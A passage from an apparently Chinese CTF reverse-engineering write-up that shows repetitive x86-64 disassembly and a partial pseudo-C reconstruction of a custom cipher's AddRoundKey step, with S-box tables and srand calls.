</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">add</span><span class="w">     </span><span class="n">dword</span><span class="w"> </span><span class="n">ptr</span><span class="w"> </span><span class="o">[</span><span class="n">rbp</span><span class="o">-</span><span class="n">4</span><span class="o">]</span><span class="p">,</span><span class="w"> </span><span class="n">1</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">cmp</span><span class="w">     </span><span class="n">dword</span><span class="w"> </span><span class="n">ptr</span><span class="w"> </span><span class="o">[</span><span class="n">rbp</span><span class="o">-</span><span class="n">4</span><span class="o">]</span><span class="p">,</span><span class="w"> </span><span class="n">1Fh</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">mov</span><span class="w">     </span><span class="n">eax</span><span class="p">,</span><span class="w"> </span><span class="o">[</span><span class="n">rbp</span><span class="o">-</span><span class="n">8</span><span class="o">]</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">shl</span><span class="w">     </span><span class="n">eax</span><span class="p">,</span><span class="w"> </span><span class="n">5</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">mov</span><span class="w">     </span><span class="n">edx</span><span class="p">,</span><span class="w"> </span><span class="n">eax</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">mov</span><span class="w">     </span><span class="n">eax</span><span class="p">,</span><span class="w"> </span><span class="o">[</span><span class="n">rbp</span><span class="o">-</span><span class="n">4</span><span class="o">]</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">add</span><span class="w">     </span><span class="n">eax</span><span class="p">,</span><span class="w"> </span><span class="n">edx</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">movsxd</span><span class="w">  </span><span class="n">rdx</span><span class="p">,</span><span class="w"> </span><span class="n">eax</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">lea</span><span class="w">     </span><span class="n">rax</span><span class="p">,</span><span class="w"> </span><span class="n">byte_606020</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">movzx</span><span class="w">   </span><span class="n">esi</span><span class="p">,</span><span class="w"> </span><span class="kt">byte</span><span class="w"> </span><span class="n">ptr</span><span class="w"> </span><span class="o">[</span><span class="n">rdx</span><span class="o">+</span><span class="n">rax</span><span class="o">]</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">mov</span><span class="w">     </span><span class="n">eax</span><span class="p">,</span><span class="w"> </span><span class="o">[</span><span class="n">rbp</span><span class="o">-</span><span class="n">4</span><span class="o">]</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">movsxd</span><span class="w">  </span><span class="n">rdx</span><span class="p">,</span><span class="w"> </span><span class="n">eax</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">mov</span><span class="w">     </span><span class="n">rax</span><span class="p">,</span><span class="w"> </span><span class="o">[</span><span class="n">rbp</span><span class="o">-</span><span class="n">18h</span><span class="o">]</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">add</span><span class="w">     </span><span class="n">rax</span><span class="p">,</span><span class="w"> </span><span class="n">rdx</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">movzx</span><span class="w">   </span><span class="n">ecx</span><span class="p">,</span><span class="w"> </span><span class="kt">byte</span><span class="w"> </span><span class="n">ptr</span><span class="w"> </span><span class="o">[</span><span class="n">rax</span><span class="o">]</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">mov</span><span class="w">     </span><span class="n">eax</span><span class="p">,</span><span class="w"> </span><span class="o">[</span><span class="n">rbp</span><span class="o">-</span><span class="n">8</span><span class="o">]</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">shl</span><span class="w">     </span><span class="n">eax</span><span class="p">,</span><span class="w"> </span><span class="n">5</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">mov</span><span class="w">     </span><span class="n">edx</span><span class="p">,</span><span class="w"> </span><span class="n">eax</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">mov</span><span class="w">     </span><span class="n">eax</span><span class="p">,</span><span class="w"> </span><span class="o">[</span><span class="n">rbp</span><span class="o">-</span><span class="n">4</span><span class="o">]</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">add</span><span class="w">     </span><span class="n">eax</span><span class="p">,</span><span class="w"> </span><span class="n">edx</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">xor</span><span class="w">     </span><span class="n">ecx</span><span class="p">,</span><span class="w"> </span><span class="n">esi</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">movsxd</span><span class="w">  </span><span class="n">rdx</span><span class="p">,</span><span class="w"> </span><span class="n">eax</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">lea</span><span class="w">     </span><span class="n">rax</span><span class="p">,</span><span class="w"> </span><span class="n">byte_606020</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">mov</span><span class="w">     </span><span class="o">[</span><span class="n">rdx</span><span class="o">+</span><span class="n">rax</span><span class="o">]</span><span class="p">,</span><span class="w"> </span><span class="n">cl</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">mov</span><span class="w">     </span><span class="n">eax</span><span class="p">,</span><span class="w"> </span><span class="o">[</span><span class="n">rbp</span><span class="o">-</span><span class="n">8</span><span class="o">]</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">shl</span><span class="w">     </span><span class="n">eax</span><span class="p">,</span><span class="w"> </span><span class="n">5</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">mov</span><span class="w">     </span><span class="n">edx</span><span class="p">,</span><span class="w"> </span><span class="n">eax</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">mov</span><span class="w">     </span><span class="n">eax</span><span class="p">,</span><span class="w"> </span><span class="o">[</span><span class="n">rbp</span><span class="o">-</span><span class="n">4</span><span class="o">]</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">add</span><span class="w">     </span><span class="n">eax</span><span class="p">,</span><span class="w"> </span><span class="n">edx</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">movsxd</span><span class="w">  </span><span class="n">rdx</span><span class="p">,</span><span class="w"> </span><span class="n">eax</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">lea</span><span class="w">     </span><span class="n">rax</span><span class="p">,</span><span class="w"> </span><span class="n">byte_606120</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">movzx</span><span class="w">   </span><span class="n">esi</span><span class="p">,</span><span class="w"> </span><span class="kt">byte</span><span class="w"> </span><span class="n">ptr</span><span class="w"> </span><span class="o">[</span><span class="n">rdx</span><span class="o">+</span><span class="n">rax</span><span class="o">]</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">mov</span><span class="w">     </span><span class="n">eax</span><span class="p">,</span><span class="w"> </span><span class="o">[</span><span class="n">rbp</span><span class="o">-</span><span class="n">4</span><span class="o">]</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">movsxd</span><span class="w">  </span><span class="n">rdx</span><span class="p">,</span><span class="w"> </span><span class="n">eax</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">mov</span><span class="w">     </span><span class="n">rax</span><span class="p">,</span><span class="w"> </span><span class="o">[</span><span class="n">rbp</span><span class="o">-</span><span class="n">18h</span><span class="o">]</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">add</span><span class="w">     </span><span class="n">rax</span><span class="p">,</span><span class="w"> </span><span class="n">rdx</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">movzx</span><span class="w">   </span><span class="n">ecx</span><span class="p">,</span><span class="w"> </span><span class="kt">byte</span><span class="w"> </span><span class="n">ptr</span><span class="w"> </span><span class="o">[</span><span class="n">rax</span><span class="o">]</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">mov</span><span class="w">     </span><span class="n">eax</span><span class="p">,</span><span class="w"> </span><span class="o">[</span><span class="n">rbp</span><span class="o">-</span><span class="n">8</span><span class="o">]</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">shl</span><span class="w">     </span><span class="n">eax</span><span class="p">,</span><span class="w"> </span><span class="n">5</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">mov</span><span class="w">     </span><span class="n">edx</span><span class="p">,</span><span class="w"> </span><span class="n">eax</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">mov</span><span class="w">     </span><span class="n">eax</span><span class="p">,</span><span class="w"> </span><span class="o">[</span><span class="n">rbp</span><span class="o">-</span><span class="n">4</span><span class="o">]</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">add</span><span class="w">     </span><span class="n">eax</span><span class="p">,</span><span class="w"> </span><span class="n">edx</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">xor</span><span class="w">     </span><span class="n">ecx</span><span class="p">,</span><span class="w"> </span><span class="n">esi</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">movsxd</span><span class="w">  </span><span class="n">rdx</span><span class="p">,</span><span class="w"> </span><span class="n">eax</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">lea</span><span class="w">     </span><span class="n">rax</span><span class="p">,</span><span class="w"> </span><span class="n">byte_606120</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">mov</span><span class="w">     </span><span class="o">[</span><span class="n">rdx</span><span class="o">+</span><span class="n">rax</span><span class="o">]</span><span class="p">,</span><span class="w"> </span><span class="n">cl</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">add</span><span class="w">     </span><span class="n">dword</span><span class="w"> </span><span class="n">ptr</span><span class="w"> </span><span class="o">[</span><span class="n">rbp</span><span class="o">-</span><span class="n">4</span><span class="o">]</span><span class="p">,</span><span class="w"> </span><span class="n">1</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">cmp</span><span class="w">     </span><span class="n">dword</span><span class="w"> </span><span class="n">ptr</span><span class="w"> </span><span class="o">[</span><span class="n">rbp</span><span class="o">-</span><span class="n">4</span><span class="o">]</span><span class="p">,</span><span class="w"> </span><span class="n">1Fh</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">mov</span><span class="w">     </span><span class="n">eax</span><span class="p">,</span><span class="w"> </span><span class="o">[</span><span class="n">rbp</span><span class="o">-</span><span class="n">8</span><span class="o">]</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">shl</span><span class="w">     </span><span class="n">eax</span><span class="p">,</span><span class="w"> </span><span class="n">5</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">mov</span><span class="w">     </span><span class="n">edx</span><span class="p">,</span><span class="w"> </span><span class="n">eax</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">mov</span><span class="w">     </span><span class="n">eax</span><span class="p">,</span><span class="w"> </span><span class="o">[</span><span class="n">rbp</span><span class="o">-</span><span class="n">4</span><span class="o">]</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">add</span><span class="w">     </span><span class="n">eax</span><span class="p">,</span><span class="w"> </span><span class="n">edx</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">movsxd</span><span class="w">  </span><span class="n">rdx</span><span class="p">,</span><span class="w"> </span><span class="n">eax</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">lea</span><span class="w">     </span><span class="n">rax</span><span class="p">,</span><span class="w"> </span><span class="n">byte_606020</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">movzx</span><span class="w">   </span><span class="n">esi</span><span class="p">,</span><span class="w"> </span><span class="kt">byte</span><span class="w"> </span><span class="n">ptr</span><span class="w"> </span><span class="o">[</span><span class="n">rdx</span><span class="o">+</span><span class="n">rax</span><span class="o">]</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">mov</span><span class="w">     </span><span class="n">eax</span><span class="p">,</span><span class="w"> </span><span class="o">[</span><span class="n">rbp</span><span class="o">-</span><span class="n">4</span><span class="o">]</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">movsxd</span><span class="w">  </span><span class="n">rdx</span><span class="p">,</span><span class="w"> </span><span class="n">eax</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">mov</span><span class="w">     </span><span class="n">rax</span><span class="p">,</span><span class="w"> </span><span class="o">[</span><span class="n">rbp</span><span class="o">-</span><span class="n">18h</span><span class="o">]</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">add</span><span class="w">     </span><span class="n">rax</span><span class="p">,</span><span class="w"> </span><span class="n">rdx</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">movzx</span><span class="w">   </span><span class="n">ecx</span><span class="p">,</span><span class="w"> </span><span class="kt">byte</span><span class="w"> </span><span class="n">ptr</span><span class="w"> </span><span class="o">[</span><span class="n">rax</span><span class="o">]</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">mov</span><span class="w">     </span><span class="n">eax</span><span class="p">,</span><span class="w"> </span><span class="o">[</span><span class="n">rbp</span><span class="o">-</span><span class="n">8</span><span class="o">]</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">shl</span><span class="w">     </span><span class="n">eax</span><span class="p">,</span><span class="w"> </span><span class="n">5</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">mov</span><span class="w">     </span><span class="n">edx</span><span class="p">,</span><span class="w"> </span><span class="n">eax</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">mov</span><span class="w">     </span><span class="n">eax</span><span class="p">,</span><span class="w"> </span><span class="o">[</span><span class="n">rbp</span><span class="o">-</span><span class="n">4</span><span class="o">]</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">add</span><span class="w">     </span><span class="n">eax</span><span class="p">,</span><span class="w"> </span><span class="n">edx</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">xor</span><span class="w">     </span><span class="n">ecx</span><span class="p">,</span><span class="w"> </span><span class="n">esi</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">movsxd</span><span class="w">  </span><span class="n">rdx</span><span class="p">,</span><span class="w"> </span><span class="n">eax</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">lea</span><span class="w">     </span><span class="n">rax</span><span class="p">,</span><span class="w"> </span><span class="n">byte_606020</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">mov</span><span class="w">     </span><span class="o">[</span><span class="n">rdx</span><span class="o">+</span><span class="n">rax</span><span class="o">]</span><span class="p">,</span><span class="w"> </span><span class="n">cl</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">mov</span><span class="w">     </span><span class="n">eax</span><span class="p">,</span><span class="w"> </span><span class="o">[</span><span class="n">rbp</span><span class="o">-</span><span class="n">8</span><span class="o">]</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">shl</span><span class="w">     </span><span class="n">eax</span><span class="p">,</span><span class="w"> </span><span class="n">5</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">mov</span><span class="w">     </span><span class="n">edx</span><span class="p">,</span><span class="w"> </span><span class="n">eax</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">mov</span><span class="w">     </span><span class="n">eax</span><span class="p">,</span><span class="w"> </span><span class="o">[</span><span class="n">rbp</span><span class="o">-</span><span class="n">4</span><span class="o">]</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">add</span><span class="w">     </span><span class="n">eax</span><span class="p">,</span><span class="w"> </span><span class="n">edx</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">movsxd</span><span class="w">  </span><span class="n">rdx</span><span class="p">,</span><span class="w"> </span><span class="n">eax</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">lea</span><span class="w">     </span><span class="n">rax</span><span class="p">,</span><span class="w"> </span><span class="n">byte_606120</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">movzx</span><span class="w">   </span><span class="n">esi</span><span class="p">,</span><span class="w"> </span><span class="kt">byte</span><span class="w"> </span><span class="n">ptr</span><span class="w"> </span><span class="o">[</span><span class="n">rdx</span><span class="o">+</span><span class="n">rax</span><span class="o">]</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">mov</span><span class="w">     </span><span class="n">eax</span><span class="p">,</span><span class="w"> </span><span class="o">[</span><span class="n">rbp</span><span class="o">-</span><span class="n">4</span><span class="o">]</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">movsxd</span><span class="w">  </span><span class="n">rdx</span><span class="p">,</span><span class="w"> </span><span class="n">eax</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">mov</span><span class="w">     </span><span class="n">rax</span><span class="p">,</span><span class="w"> </span><span class="o">[</span><span class="n">rbp</span><span class="o">-</span><span class="n">18h</span><span class="o">]</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">add</span><span class="w">     </span><span class="n">rax</span><span class="p">,</span><span class="w"> </span><span class="n">rdx</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">movzx</span><span class="w">   </span><span class="n">ecx</span><span class="p">,</span><span class="w"> </span><span class="kt">byte</span><span class="w"> </span><span class="n">ptr</span><span class="w"> </span><span class="o">[</span><span class="n">rax</span><span class="o">]</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">mov</span><span class="w">     </span><span class="n">eax</span><span class="p">,</span><span class="w"> </span><span class="o">[</span><span class="n">rbp</span><span class="o">-</span><span class="n">8</span><span class="o">]</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">shl</span><span class="w">     </span><span class="n">eax</span><span class="p">,</span><span class="w"> </span><span class="n">5</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">mov</span><span class="w">     </span><span class="n">edx</span><span class="p">,</span><span class="w"> </span><span class="n">eax</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">mov</span><span class="w">     </span><span class="n">eax</span><span class="p">,</span><span class="w"> </span><span class="o">[</span><span class="n">rbp</span><span class="o">-</span><span class="n">4</span><span class="o">]</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">add</span><span class="w">     </span><span class="n">eax</span><span class="p">,</span><span class="w"> </span><span class="n">edx</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">xor</span><span class="w">     </span><span class="n">ecx</span><span class="p">,</span><span class="w"> </span><span class="n">esi</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">movsxd</span><span class="w">  </span><span class="n">rdx</span><span class="p">,</span><span class="w"> </span><span class="n">eax</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">lea</span><span class="w">     </span><span class="n">rax</span><span class="p">,</span><span class="w"> </span><span class="n">byte_606120</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">mov</span><span class="w">     </span><span class="o">[</span><span class="n">rdx</span><span class="o">+</span><span class="n">rax</span><span class="o">]</span><span class="p">,</span><span class="w"> </span><span class="n">cl</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">add</span><span class="w">     </span><span class="n">dword</span><span class="w"> </span><span class="n">ptr</span><span class="w"> </span><span class="o">[</span><span class="n">rbp</span><span class="o">-</span><span class="n">4</span><span class="o">]</span><span class="p">,</span><span class="w"> </span><span class="n">1</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">cmp</span><span class="w">     </span><span class="n">dword</span><span class="w"> </span><span class="n">ptr</span><span class="w"> </span><span class="o">[</span><span class="n">rbp</span><span class="o">-</span><span class="n">4</span><span class="o">]</span><span class="p">,</span><span class="w"> </span><span class="n">1Fh</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>但是重复的地方非常多。直接关注特殊字符串和数组调用，发现两个256大小的sbox，最开始初始化的32字节数组，以及srand、rand等调用,一段一段的还原成伪C(大概还原了整个Addroundkey)</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-C++" data-lang="C++"><span class="line"><span class="cl"><span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">byte_606020</span><span class="p">[</span><span class="mh">0x400</span><span class="p">];</span> 
</span></span><span class="line"><span class="cl"><span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">byte_606120</span><span class="p">[</span><span class="mh">0x400</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">process</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="n">buf</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">8</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> 
</span></span><span class="line"><span class="cl">        <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="mi">32</span><span class="p">;</span> <span class="n">j</span><span class="o">++</span><span class="p">)</span> 
</span></span><span class="line"><span class="cl">                <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="kt">int</span> <span class="n">offset</span> <span class="o">=</span> <span class="n">i</span> <span class="o">*</span> <span class="mi">32</span> <span class="o">+</span> <span class="n">j</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="n">byte_606020</span><span class="p">[</span><span class="n">offset</span><span class="p">]</span> <span class="o">^=</span> <span class="n">buf</span><span class="p">[</span><span class="n">j</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">            <span class="n">byte_606120</span><span class="p">[</span><span class="n">offset</span><span class="p">]</span> <span class="o">^=</span> <span class="n">buf</span><span class="p">[</span><span class="n">j</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;ooooooooooooo ...&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;8&#39;   888   `8 ...&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;     888      oooo d8b  .oooo.    .oooo ...&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;     888      `888</span><span class="se">\&#34;\&#34;</span><span class="s">8P `P  )88b  d88&#39; ...&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;     888       888      .oP</span><span class="se">\&#34;</span><span class="s">888  888  ...&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;     888       888     d8(  888  888   ...&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;    o888o     d888b    `Y888</span><span class="se">\&#34;\&#34;</span><span class="s">8o `Y8b ...&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">srand</span><span class="p">(</span><span class="mh">0x10000</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">process</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mh">0x140</span><span class="p">];</span>     
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">len</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">ch</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span>  <span class="nb">NULL</span><span class="p">,</span> <span class="n">_IONBF</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">_IONBF</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
